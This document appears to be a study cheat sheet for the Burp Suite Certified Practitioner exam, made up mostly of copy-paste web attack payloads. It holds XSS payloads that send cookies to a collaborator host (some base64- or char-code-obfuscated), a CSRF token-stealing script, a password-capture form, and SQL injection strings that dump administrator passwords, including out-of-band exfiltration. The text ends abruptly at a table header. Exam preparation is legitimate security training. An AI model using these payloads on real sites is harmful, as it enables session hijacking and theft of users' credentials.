# BSCP Exam Payloads - Complete Reference

## 📋 Table of Contents

### 🎯 Quick Access by Vulnerability Type
- [XSS (Cross-Site Scripting)](#xss)
- [SQL Injection](#sql-injection)
- [CSRF (Cross-Site Request Forgery)](#csrf)
- [Clickjacking](#clickjacking)
- [XXE (XML External Entity)](#xxe)
- [SSRF (Server-Side Request Forgery)](#ssrf)
- [Access Control](#access-control)
- [Deserialization](#deserialization)
- [SSTI (Server-Side Template Injection)](#ssti)
- [Command Injection](#command-injection)
- [Path Traversal](#path-traversal)
- [SSRF via PDF](#ssrf-via-pdf)
- [File Upload](#file-upload)
- [Stage 3 Quick Reference](#stage-3-quick-reference)
- [Exam Patterns](#exam-patterns)

---

### 🔥 XSS Attack Patterns
- [DOM XSS via innerHTML](#pattern-dom-xss-via-innerhtml)
- [Iframe-Based DOM XSS Event Handlers](#pattern-iframe-based-dom-xss-event-handlers)
  - [onload Event](#onload-event)
  - [onmessage Event (postMessage)](#onmessage-event-postmessage)
  - [onresize Event](#onresize-event)
  - [onfocus Event](#onfocus-event)
  - [onpageshow Event](#onpageshow-event)
  - [onhashchange Event](#onhashchange-event)
  - [onanimationstart Event](#onanimationstart-event)
  - [ontoggle Event (details element)](#ontoggle-event-details-element)
  - [onerror Event](#onerror-event)
  - [onscroll Event](#onscroll-event)
  - [Event Handler Syntax Reference](#event-handler-syntax-reference)
- [AngularJS Expression Injection](#pattern-angularjs-expression-injection)
- [Event Handler Injection](#pattern-event-handler-injection)
- [JavaScript Context Escape](#pattern-javascript-context-escape)
  - [Template Literal - String.fromCharCode Bypass](#template-literal---stringfromcharcode-bypass)
  - [Template Literal with Function Constructor](#template-literal-with-function-constructor-advanced)
  - [JSON Injection via eval()](#pattern-json-injection-via-eval)
  - [JSON.parse Bypass with Function Constructor](#jsonparse-bypass-with-function-constructor)
- [Web Message Exploitation](#pattern-web-message-exploitation)
- [DOM-Based Cookie Manipulation](#pattern-dom-based-cookie-manipulation)
- [CSRF Token Theft via XSS](#pattern-csrf-token-theft-via-xss)
- [Password Capture](#pattern-password-capture)

---

### 💉 SQL Injection Patterns
- [Quick Attack Template (10-20 mins)](#quick-attack-template-10-20-mins)
  - [Step 1: Detection](#step-1-detection-2-mins)
  - [Step 2: SQLMap](#step-2-sqlmap-recommended---10-mins)
  - [Step 3: Manual Exploitation](#step-3-manual-exploitation-if-sqlmap-fails)
    - [Error-Based (Fastest - 5 mins)](#error-based-fastest---5-mins)
    - [Union-Based (10 mins)](#union-based-10-mins)
    - [Blind SQLi - Boolean-Based (15 mins)](#blind-sqli---boolean-based-15-mins)
    - [Blind SQLi - Time-Based (20 mins)](#blind-sqli---time-based-20-mins)
    - [Blind SQLi - Out-of-Band (15 mins)](#blind-sqli---out-of-band-15-mins)
  - [Step 4: XML-Based SQLi](#step-4-xml-based-sqli-if-in-xml-context)
  - [ORDER BY / GROUP BY Injection](#pattern-order-by--group-by-injection)
- [Database-Specific Cheat Sheet](#database-specific-cheat-sheet)
- [Common Injection Points](#common-injection-points)

---

### 🔐 CSRF Patterns
- [Referer Bypass](#pattern-referer-bypass)
- [Token Duplication via CRLF](#pattern-token-duplication-via-crlf)
- [SameSite Bypass via OAuth Refresh](#pattern-samesite-bypass-via-oauth-refresh)

---

### 🖱️ Clickjacking Patterns
- [Basic Clickjacking Attack](#basic-clickjacking-attack)
- [Clickjacking + XSS (Pre-filled Form)](#clickjacking--xss-pre-filled-form)
- [Positioning Tips](#positioning-tips)
- [Defense Check](#defense-check)

---

### 📄 XXE Patterns
- [Blind XXE with Out-of-Band Interaction](#pattern-blind-xxe-with-out-of-band-interaction)
- [Blind XXE - Data Exfiltration via External DTD](#pattern-blind-xxe---data-exfiltration-via-external-dtd)
- [Blind XXE - Error-Based Exfiltration](#pattern-blind-xxe---error-based-exfiltration)
- [XInclude Attack](#pattern-xinclude-attack)
- [XXE Quick Reference](#xxe-quick-reference)

---

### 🌐 SSRF Patterns
- [Routing-Based SSRF](#pattern-routing-based-ssrf)
- [Absolute URL Bypass](#pattern-absolute-url-bypass)
- [Localhost Bypass](#pattern-localhost-bypass)
- [Connection State Attack](#pattern-connection-state-attack)
- [Cache Poisoning via Duplicate Host](#pattern-cache-poisoning-via-duplicate-host)

---

### 🔓 Access Control Patterns
- [Referer-Based Bypass](#pattern-referer-based-bypass)
- [Method Conversion](#pattern-method-conversion)
- [Multi-Step Bypass](#pattern-multi-step-bypass)
- [IDOR with Hidden Parameters](#pattern-idor-with-hidden-parameters)

---

### 📦 Deserialization Patterns
- [PHP Type Juggling](#pattern-php-type-juggling)
- [Java ysoserial](#pattern-java-ysoserial)

---

### 🎨 SSTI Patterns
- [Template Detection](#pattern-template-detection)
- [Jinja2 (Python)](#pattern-jinja2-python)
- [Freemarker (Java)](#pattern-freemarker-java)
- [Handlebars (Node.js)](#pattern-handlebars-nodejs)

---

### 💻 Command Injection Patterns
- [DNS Exfiltration](#pattern-dns-exfiltration)
- [XML Context (DOCTYPE Disallowed)](#xml-context-doctype-disallowed)
- [Image Size Parameter](#image-size-parameter)

---

### 📁 Path Traversal Patterns
- [Double URL Encoding](#pattern-double-url-encoding)
- [Keyword Blacklist Bypass](#keyword-blacklist-bypass-hex-encode-secret)
- [Double Hex Encoding](#double-hex-encoding)

---

### 📄 SSRF via PDF Pattern
- [HTML Injection in PDF Generation](#pattern-html-injection-in-pdf-generation)

---

### 📤 File Upload Patterns
- [Polyglot PHP Web Shell](#pattern-polyglot-php-web-shell)
- [.htaccess Configuration Override](#htaccess-configuration-override)
- [Extension Bypass Techniques](#extension-bypass-techniques)

---

### ⚡ Stage 3 Quick Reference
- [Pattern Recognition (30 seconds)](#pattern-recognition-30-seconds)
- [SSTI Quick Attack (5-10 mins)](#ssti-quick-attack-5-10-mins)
- [LFI Quick Attack (5 mins)](#lfi-quick-attack-5-mins)
- [Command Injection Quick Attack (15 mins)](#command-injection-quick-attack-15-mins)
- [XXE Quick Attack (20 mins)](#xxe-quick-attack-20-mins)
- [Burp Collaborator Setup](#burp-collaborator-setup)

---

### 🎯 Exam Patterns by Stage
- [Stage 1: Get Access to Any User](#stage-1-get-access-to-any-user)
- [Stage 2: Privilege Escalation](#stage-2-privilege-escalation)
- [Stage 3: File System Access](#stage-3-file-system-access)
- [Common Exam Locations](#common-exam-locations)
- [Quick Checklist](#quick-checklist)

---

## 🔍 Search Tips
- Use `Ctrl+F` (Windows) or `Cmd+F` (Mac) to search for specific payloads
- Click any link above to jump directly to that section
- All payloads are copy-paste ready
- Replace `TARGET`, `COLLAB`, `EXPLOIT-SERVER` with actual values

---

# XSS

## Pattern: DOM XSS via innerHTML
**Common Location:** Search, feedback forms, hash fragments

### Bypass `replace()` Filtering
```html
<><img src=x onerror=alert(1)>
```
**Why:** `replace()` only replaces first occurrence

### jQuery Hash Fragment
```html
<iframe src="https://TARGET/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

---

## Pattern: Iframe-Based DOM XSS Event Handlers
**Context:** Injection point is in URL parameter like `?search=<INJECTION>`

### onload Event
**Injection point:** `?search=<body onload=PAYLOAD>`

**Basic alert:**
```html
<iframe src="https://TARGET/?search=<body onload=alert(1)>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<body onload=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
```

**How it works:**
- Payload injected into `?search=` parameter
- Server reflects `<body onload=...>` into page
- When iframe loads, `onload` event fires automatically
- No user interaction needed - auto-triggers
- `%2b` is URL-encoded `+` for concatenation

---

### onmessage Event (postMessage)
**Injection point:** `?search=<body onmessage=PAYLOAD>`

**Trigger via postMessage:**
```html
<iframe src="https://TARGET/?search=<body onmessage=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload="this.contentWindow.postMessage('trigger','*')"></iframe>
```

**With data extraction:**
```html
<iframe src="https://TARGET/?search=<body onmessage=fetch('https://COLLAB.oastify.com?data='%2bevent.data)>" onload="this.contentWindow.postMessage(document.cookie,'*')"></iframe>
```

**How it works:**
- Payload injected with `<body onmessage=...>`
- Iframe's `onload` sends message via `postMessage('trigger','*')`
- `onmessage` event handler receives the message
- `event.data` contains the message content
- Useful for web messaging vulnerabilities
- `'*'` means any origin (wildcard)

---

### onresize Event
**Injection point:** `?search=<body onresize=PAYLOAD>`

**Trigger via style change:**
```html
<iframe src="https://TARGET/?search=<body onresize=alert(1)>" onload="this.style.width='100px'"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<body onresize=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload="this.style.width='100px'"></iframe>
```

**How it works:**
- Payload injected with `<body onresize=...>`
- Iframe's `onload` changes iframe width to `100px`
- Changing iframe size triggers `onresize` event
- Body's `onresize` handler executes payload
- Auto-triggers without user interaction

---

### onfocus Event
**Injection point:** `?search=<input onfocus=PAYLOAD autofocus>`

**Auto-trigger with focus:**
```html
<iframe src="https://TARGET/?search=<input onfocus=alert(1) autofocus>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<input onfocus=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie) autofocus>"></iframe>
```

**With custom element:**
```html
<iframe src="https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x"></iframe>
```

**How it works:**
- `autofocus` attribute makes input auto-focus on load
- `onfocus` event fires when element receives focus
- No user interaction needed
- `#x` in URL auto-scrolls to element with `id=x`
- `tabindex=1` makes element focusable

---

### onpageshow Event
**Injection point:** `?search=<body onpageshow=PAYLOAD>`

**Auto-trigger on page show:**
```html
<iframe src="https://TARGET/?search=<body onpageshow=alert(1)>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<body onpageshow=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
```

**How it works:**
- `onpageshow` fires when page becomes visible
- Triggers on initial load and when navigating back
- Auto-triggers without user interaction
- Similar to `onload` but also fires on back/forward navigation

---

### onhashchange Event
**Injection point:** `?search=<body onhashchange=PAYLOAD>`

**Trigger via hash change:**
```html
<iframe src="https://TARGET/?search=<body onhashchange=alert(1)>#initial" onload="this.src='https://TARGET/?search=<body onhashchange=alert(1)>#changed'"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<body onhashchange=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>#x" onload="this.src+='#y'"></iframe>
```

**How it works:**
- Initial load with `#initial` hash
- Iframe's `onload` changes URL to `#changed`
- Hash change triggers `onhashchange` event
- `this.src+='#y'` appends to existing URL
- Requires two different hash values to trigger

---

### onanimationstart Event
**Injection point:** `?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=PAYLOAD>`

**Auto-trigger with CSS animation:**
```html
<iframe src="https://TARGET/?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=alert(1)>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<style>@keyframes x{}</style><div style=animation-name:x onanimationstart=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
```

**How it works:**
- `<style>@keyframes x{}</style>` defines CSS animation
- `style=animation-name:x` applies animation to div
- `onanimationstart` fires when animation begins
- Auto-triggers on page load
- No user interaction needed

---

### ontoggle Event (details element)
**Injection point:** `?search=<details open ontoggle=PAYLOAD>`

**Auto-trigger with open attribute:**
```html
<iframe src="https://TARGET/?search=<details open ontoggle=alert(1)>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<details open ontoggle=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
```

**How it works:**
- `<details>` element creates collapsible content
- `open` attribute makes it expanded by default
- `ontoggle` fires when details opens/closes
- Auto-triggers on page load due to `open` attribute
- Works in modern browsers

---

### onerror Event
**Injection point:** `?search=<img src=x onerror=PAYLOAD>`

**Auto-trigger on image error:**
```html
<iframe src="https://TARGET/?search=<img src=x onerror=alert(1)>"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<img src=x onerror=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>"></iframe>
```

**How it works:**
- `<img src=x>` tries to load invalid image
- Browser fails to load image `x`
- `onerror` event fires on load failure
- Auto-triggers immediately
- Most reliable auto-trigger method

---

### onwheel Event
**Injection point:** `?search=<body onwheel=PAYLOAD>`

**Trigger via scroll wheel (requires user interaction):**
```html
<iframe src="https://TARGET/?search=<body onwheel=alert(1)>"></iframe>
```

**How it works:**
- `onwheel` fires when user scrolls with mouse wheel
- **Requires user interaction** - not auto-trigger
- Not ideal for exam (user must scroll)
- Use only if auto-trigger events don't work

---

### onscroll Event
**Injection point:** `?search=<body onscroll=PAYLOAD style='height:9999px'>`

**Trigger via scroll:**
```html
<iframe src="https://TARGET/?search=<body onscroll=alert(1) style='height:9999px'>" onload="this.contentWindow.scrollTo(0,100)"></iframe>
```

**Cookie exfiltration:**
```html
<iframe src="https://TARGET/?search=<body onscroll=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie) style='height:9999px'>" onload="this.contentWindow.scrollTo(0,100)"></iframe>
```

**How it works:**
- `style='height:9999px'` makes page scrollable
- Iframe's `onload` calls `scrollTo(0,100)` to scroll down
- Scrolling triggers `onscroll` event
- Auto-triggers via programmatic scroll
- `this.contentWindow` accesses iframe's window object

---

### onpointerover Event
**Injection point:** `?search=<div onpointerover=PAYLOAD style='width:100%;height:100%'>`

**Trigger via pointer movement (requires user interaction):**
```html
<iframe src="https://TARGET/?search=<div onpointerover=alert(1) style='width:100%;height:100%'>Move mouse here</div>"></iframe>
```

**How it works:**
- `onpointerover` fires when pointer moves over element
- `style='width:100%;height:100%'` makes div full-size
- **Requires user interaction** - mouse movement
- Not ideal for exam
- Use auto-trigger events instead

---

## Event Handler Syntax Reference

### Quick Reference Table

| Event | Element | Trigger Method | Auto-Trigger? | Syntax |
|-------|---------|----------------|---------------|--------|
| `onload` | `<body>` | Page loads | ✅ Yes | `<body onload=PAYLOAD>` |
| `onmessage` | `<body>` | postMessage() | ✅ Yes (via iframe) | `<body onmessage=PAYLOAD>` |
| `onresize` | `<body>` | Resize iframe | ✅ Yes (via iframe) | `<body onresize=PAYLOAD>` |
| `onfocus` | `<input>` | autofocus | ✅ Yes | `<input onfocus=PAYLOAD autofocus>` |
| `onpageshow` | `<body>` | Page visible | ✅ Yes | `<body onpageshow=PAYLOAD>` |
| `onhashchange` | `<body>` | Hash change | ✅ Yes (via iframe) | `<body onhashchange=PAYLOAD>` |
| `onanimationstart` | `<div>` | CSS animation | ✅ Yes | `<div style=animation-name:x onanimationstart=PAYLOAD>` |
| `ontoggle` | `<details>` | open attribute | ✅ Yes | `<details open ontoggle=PAYLOAD>` |
| `onerror` | `<img>` | Invalid src | ✅ Yes | `<img src=x onerror=PAYLOAD>` |
| `onscroll` | `<body>` | scrollTo() | ✅ Yes (via iframe) | `<body onscroll=PAYLOAD style='height:9999px'>` |
| `onwheel` | `<body>` | Mouse wheel | ❌ No | `<body onwheel=PAYLOAD>` |
| `onpointerover` | `<div>` | Mouse move | ❌ No | `<div onpointerover=PAYLOAD>` |

---

### Event Handler Arguments

**onload**
- **Arguments:** None
- **Usage:** `<body onload=alert(1)>`
- **Trigger:** Automatic on page load

**onmessage**
- **Arguments:** `event` (implicit)
- **Access data:** `event.data`
- **Usage:** `<body onmessage=fetch('https://x.com?d='+event.data)>`
- **Trigger:** `iframe.contentWindow.postMessage('data','*')`

**onresize**
- **Arguments:** None
- **Usage:** `<body onresize=alert(1)>`
- **Trigger:** `iframe.style.width='100px'`

**onfocus**
- **Arguments:** None
- **Usage:** `<input onfocus=alert(1) autofocus>`
- **Trigger:** Automatic with `autofocus` attribute

**onpageshow**
- **Arguments:** `event` (implicit)
- **Usage:** `<body onpageshow=alert(1)>`
- **Trigger:** Automatic on page show

**onhashchange**
- **Arguments:** None
- **Usage:** `<body onhashchange=alert(1)>`
- **Trigger:** `iframe.src+='#newHash'`

**onanimationstart**
- **Arguments:** None
- **Usage:** `<div style=animation-name:x onanimationstart=alert(1)>`
- **Requires:** `<style>@keyframes x{}</style>`
- **Trigger:** Automatic when animation starts

**ontoggle**
- **Arguments:** None
- **Usage:** `<details open ontoggle=alert(1)>`
- **Trigger:** Automatic with `open` attribute

**onerror**
- **Arguments:** None
- **Usage:** `<img src=x onerror=alert(1)>`
- **Trigger:** Automatic on load failure

**onscroll**
- **Arguments:** None
- **Usage:** `<body onscroll=alert(1) style='height:9999px'>`
- **Trigger:** `iframe.contentWindow.scrollTo(0,100)`

---

### Common Mistakes to Avoid

❌ **Wrong:** `<body onload="alert(1)">`  
✅ **Correct:** `<body onload=alert(1)>` (no quotes in URL parameter)

❌ **Wrong:** `<body onmessage=alert(data)>`  
✅ **Correct:** `<body onmessage=alert(event.data)>` (use `event.data`)

❌ **Wrong:** `<input onfocus=alert(1)>`  
✅ **Correct:** `<input onfocus=alert(1) autofocus>` (need `autofocus`)

❌ **Wrong:** `<body onresize=alert(1)>` (no trigger)  
✅ **Correct:** `<iframe src="..." onload="this.style.width='100px'">` (trigger in iframe)

❌ **Wrong:** `<details ontoggle=alert(1)>`  
✅ **Correct:** `<details open ontoggle=alert(1)>` (need `open` attribute)

---

### Iframe Trigger Methods

**postMessage trigger:**
```javascript
iframe.contentWindow.postMessage('message', '*')
```

**Resize trigger:**
```javascript
iframe.style.width = '100px'
```

**Scroll trigger:**
```javascript
iframe.contentWindow.scrollTo(0, 100)
```

**Hash change trigger:**
```javascript
iframe.src += '#newHash'
// or
iframe.src = 'https://TARGET/?search=<payload>#changed'
```

---

## Exam Tips - Iframe DOM XSS

1. **Injection point is in URL parameter** - `?search=`, `?query=`, `?message=`
2. **Event must auto-trigger** - Use `onload`, `onpageshow`, `onerror`, `autofocus`
3. **Trigger from iframe onload** - `onload="this.contentWindow.postMessage(...)"`
4. **URL encode special chars** - `+` = `%2b`, space = `%20`
5. **Use %2b for +** - In cookie exfiltration: `'%2bdocument.cookie`
6. **Test auto-trigger events first** - Don't rely on user interaction
7. **onmessage needs postMessage** - Trigger from iframe's onload

---

## Pattern: AngularJS Expression Injection
**Detection:** Look for `ng-app` directive

### Basic Alert
```
{{$on.constructor('alert(1)')()}}
```

### Cookie Exfiltration
```
{{$on.constructor('eval(atob(\'dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCAnaHR0cHM6Ly9DT0xMQUIub2FzdGlmeS5jb20/Yz0nK2RvY3VtZW50LmNvb2tpZSx0cnVlKTt4aHIuc2VuZCgpOw==\'))')()}}
```

---

## Pattern: Event Handler Injection
**Context:** Angle brackets encoded, attributes allowed

### Attribute Breakout
```
"> onmouseover="alert(1)
```

### Custom Tag with Focus
```html
<script>
location = 'https://TARGET/?search=<xss id=x onfocus=alert(1) tabindex=1>#x';
</script>
```

### SVG Animate
```
<svg><animatetransform onbegin=alert(1)>
```

### Body Resize
```html
<iframe src="https://TARGET/?search='<body onresize=print()>" onload=this.style.width='100px'></iframe>
```

```html
<iframe src="https://TARGET/?search=<body onresize=fetch('https://COLLAB.oastify.com?c='%2bdocument.cookie)>" onload=this.style.width='100px'></iframe>
```

---

## Pattern: JavaScript Context Escape

### String Breakout
```
';alert(1);//
```

### Template Literal
```
${alert(1)}
```

### Template Literal - String.fromCharCode Bypass
**Context:** Angle brackets, quotes, backslash, and backticks are Unicode-escaped

**Payload:**
```
${fetch(String.fromCharCode(104,116,116,112,58,47,47,99,111,108,108,97,98,46,99,111,109))}
```

**How it works:**
- Template literal context: `` `${...}` ``
- All special chars Unicode-escaped: `<`, `>`, `'`, `"`, `\`, `` ` ``
- `String.fromCharCode()` builds string from char codes
- No quotes or special chars needed
- Bypasses Unicode escaping filter

**Character codes:**
```
104 = h
116 = t
116 = t
112 = p
58  = :
47  = /
47  = /
99  = c
111 = o
108 = l
108 = l
97  = a
98  = b
46  = .
99  = c
111 = o
109 = m
```

**Result:** `http://collab.com`

**Cookie exfiltration:**
```
${fetch(String.fromCharCode(104,116,116,112,115,58,47,47,67,79,76,76,65,66,46,111,97,115,116,105,102,121,46,99,111,109,47,63,99,61)+document.cookie)}
```

```
${eval(String.fromCharCode(102,101,116,99,104,40,34,104,116,116,112,115,58,47,47,111,115,107,115,105,120,97,55,110,116,99,122,52,98,97,106,55,110,107,50,116,111,113,100,54,52,99,118,48,115,111,104,46,111,97,115,116,105,102,121,46,99,111,109,47,63,99,61,34,43,100,111,99,117,109,101,110,116,46,99,111,111,107,101,41))}
```

**Breakdown:**
- `https://COLLAB.oastify.com/?c=` in char codes and `+document.cookie` appends 

```py
>>> for i in x:
...     print(ord(i), end=",")
```

- No quotes or special chars used

**Generate char codes (JavaScript):**
```javascript
'https://COLLAB.oastify.com/?c='.split('').map(c => c.charCodeAt(0)).join(',')
```

---

### Template Literal with Function Constructor (Advanced)
**Context:** Complex filtering, template literal injection with hex encoding

```html
<script>
document.location = "https://TARGET/?find="-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//"
</script>
```

**How it works:**
1. Injects into template literal context
2. Uses `Function` constructor to create function
3. Hex encodes parentheses: `\x28` = `(`, `\x2b` = `+`
4. Bypasses filters looking for `(` and `+`
5. Executes `fetch()` to exfiltrate cookie

**Breakdown:**
- `"-Function` - Closes string, starts Function constructor
- `` `return fetch\x28...` `` - Template literal with hex-encoded chars
- `\x28` = `(`, `\x2b` = `+`
- `` ``` `` - Closes template literal
- `}//` - Closes context and comments out rest

### Backslash Bypass (JSON)
```
\"-alert(1)}//
```
**Result:** `{"searchTerm":"\\"-alert(1)}//"}` - Double backslash cancels escaping

### Script Tag Closure
```
</script><script>alert(1)</script>
```

---

## Pattern: JSON Injection via eval()
**Context:** Code uses `eval()` instead of `JSON.parse()` to parse JSON response

### Vulnerable Code Pattern
```javascript
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);
        displaySearchResults(searchResultsObj);
    }
}
```

### Payload - Close JSON and Execute Code
```
ss"};document.location='http://COLLAB.oastify.com/?c='+document.cookie;//
```

**How it works:**
1. `ss` - Completes the current JSON string value
2. `"}` - Closes the JSON string and object
3. `;` - Ends the variable assignment statement
4. `document.location='...'` - Arbitrary JavaScript code
5. `//` - Comments out the rest of the original code

**Full eval() execution:**
```javascript
eval('var searchResultsObj = {"results":"ss"};document.location=\'http://COLLAB.oastify.com/?c=\'+document.cookie;//"}');
```

**Result:** Cookie exfiltrated to Burp Collaborator

---

### Alternative Payloads

**Using alert:**
```
test"};alert(document.cookie);//
```

**Using fetch:**
```
x"};fetch('https://COLLAB.oastify.com?c='+document.cookie);//
```

**Using XMLHttpRequest:**
```
a"};var xhr=new XMLHttpRequest();xhr.open('GET','https://COLLAB.oastify.com?c='+document.cookie);xhr.send();//
```

**Multiline payload:**
```
"};
var img=new Image();
img.src='https://COLLAB.oastify.com?c='+document.cookie;
//
```

---

### Detection Tips

**Look for these patterns in JavaScript:**
- `eval('var x = ' + response)`
- `eval(response)`
- `eval('...' + userInput + '...')`
- Any `eval()` with concatenated strings

**Why it's vulnerable:**
- `eval()` executes code, not just parses JSON
- Should use `JSON.parse()` instead
- Allows breaking out of JSON structure

---

### JSON.parse Bypass with Function Constructor
**Context:** Even with `JSON.parse()`, can break out of JSON context in search parameter

**Payload:**
```
\"-Function('return fetch("https://COLLAB.oastify.com/?"+document.cookie)')()}//\"
```

**URL-encoded:**
```
%5C%22-Function(%27return%20fetch(%22https://COLLAB.oastify.com/?%22%2bdocument.cookie)%27)()}%2F%2F%22
```

**How it works:**
1. `\"` - Escapes the quote (backslash not escaped)
2. `-Function(...)` - Uses Function constructor
3. `'return fetch(...)'` - Function body with fetch
4. `()` - Immediately invokes the function
5. `}//` - Closes context and comments out rest
6. `\"` - Final quote to close

**Full URL:**
```
https://TARGET/?search=\"-Function('return fetch("https://COLLAB.oastify.com/?"+document.cookie)')()}//\"
```

**Why it works:**
- Backslash not escaped in JSON context
- `\"` becomes `"` after one level of parsing
- Function constructor executes arbitrary code
- Hex encoding (`\x28`, `\x2b`) bypasses parentheses/plus filters

**Alternative with hex encoding:**
```
\"-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//\"
```

**Breakdown:**
- `\x28` = `(`
- `\x2b` = `+`
- `\x29` = `)`
- Bypasses filters looking for `(` and `+`

---

## Pattern: Web Message Exploitation


```
<script>
document.location = "https://TARGET/?find="-Function`return fetch\x28'https://COLLAB.oastify.com/?'\x2bdocument.cookie\x29```}//"
</script>
```


### PostMessage to innerHTML
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### JavaScript URL Bypass
```html
<iframe src="https://TARGET/" onload="this.contentWindow.postMessage('javascript:print()//http://','*')">
```

### JSON.parse Sink
```html
<iframe src=https://TARGET/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:print()\"}","*")'>
```

Exfiltration via postMessage:
```html
<iframe src=https://TARGET/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\", \"url\": \"javascript:fetch(`https://COLLAB_URL/?c=${document.cookie}`)\"}","*")'>
```

---

## Pattern: DOM-Based Cookie Manipulation
**Context:** Cookie set via DOM, XSS in product parameter

```html
<iframe src="https://TARGET/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://TARGET';window.x=1;">
```

**How it works:**
1. First load: XSS payload in URL sets malicious cookie
2. `onload` redirects to homepage (clears URL)
3. `window.x=1` prevents infinite loop
4. Homepage uses poisoned cookie → XSS executes

---

## Pattern: CSRF Token Theft via XSS
```js
var xhr = new XMLHttpRequest();
xhr.open("GET", "/my-account", true);
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
        var doc = new DOMParser().parseFromString(xhr.responseText, "text/html");
        var token = doc.querySelector("input[name='csrf']").value;
        var xhr2 = new XMLHttpRequest();
        xhr2.open("POST", "/my-account/change-email", true);
        xhr2.send("email=hacker@evil.com&csrf=" + token);
    }
};
xhr.send();
```

---

## Pattern: Password Capture
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://COLLAB.oastify.com',{
    method:'POST',
    mode:'no-cors',
    body:username.value+':'+this.value
  });">
```

---

# SQL Injection

## Quick Attack Template (10-20 mins)

### Step 1: Detection (2 mins)
**Test these locations:**
- [ ] TrackingId cookie
- [ ] Search parameters
- [ ] Category filters
- [ ] Product ID

**Detection Payloads:**
```sql
'
''
`
;
' OR '1'='1
' OR 1=1--
```

**Confirmed if:** Error message, different response, or time delay

---

### Step 2: SQLMap (Recommended - 10 mins)

**Capture request to file:**
```bash
# Save request in Burp to request.txt
```

**Run SQLMap:**
```bash
sqlmap -r request.txt --level 5 --risk 3 --batch --dump
```

**Why SQLMap:**
- Saves time (exam is 4 hours)
- Handles complex scenarios
- Automatically extracts data
- Runs in background

**If SQLMap works:** Skip to Step 5

---

### Step 3: Manual Exploitation (If SQLMap Fails)

#### Error-Based (Fastest - 5 mins)

**PostgreSQL/SQL Server:**
```sql
' AND 1=CAST((SELECT password FROM users WHERE username='administrator') AS int)--
```

**Result:** Password appears in error message

---

#### Union-Based (10 mins)

**Step 3a: Find Column Count**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
**Stop when error occurs**

**Step 3b: Find String Columns**
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

**Then test which columns accept strings:**
```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

**Step 3c: Extract Data**
```sql
' UNION SELECT username,password,NULL FROM users--
```

**PostgreSQL Concatenation:**
```sql
' UNION SELECT username || '~' || password,NULL,NULL FROM users--
```

---

#### Blind SQLi - Boolean-Based (15 mins)

**Test for Boolean Response:**
```sql
' AND '1'='1
' AND '1'='2
```

**Extract Password Character by Character:**
```sql
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a
```

**Use Burp Intruder:**
- Position: `='§a§`
- Payload: a-z, 0-9
- Grep: Look for different response length

---

#### Blind SQLi - Time-Based (20 mins)

**PostgreSQL:**
```sql
' AND (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users)--
```

**MS SQL:**
```sql
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a' WAITFOR DELAY '0:0:10'--
```

**Use Burp Intruder with time-based detection**

---

#### Blind SQLi - Out-of-Band (15 mins)

**MS SQL Server:**
```sql
'; exec master..xp_dirtree '//COLLAB.oastify.com/a'--
```

**Oracle - Data Exfiltration:**
```sql
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

**Check Burp Collaborator for DNS/HTTP requests**

---

### Step 4: XML-Based SQLi (If in XML Context)

**Use Hackvertor Extension:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId><@dec_entities>1 UNION SELECT password FROM users WHERE username='administrator'-- -</@dec_entities></productId>
  <storeId>1</storeId>
</stockCheck>
```

---

### Step 5: Login as Administrator

**Use extracted credentials:**
- Username: `administrator`
- Password: `[extracted password]`

---

## Database-Specific Cheat Sheet

| Database | Comment | String Concat | Time Delay | Version |
|----------|---------|---------------|------------|---------|
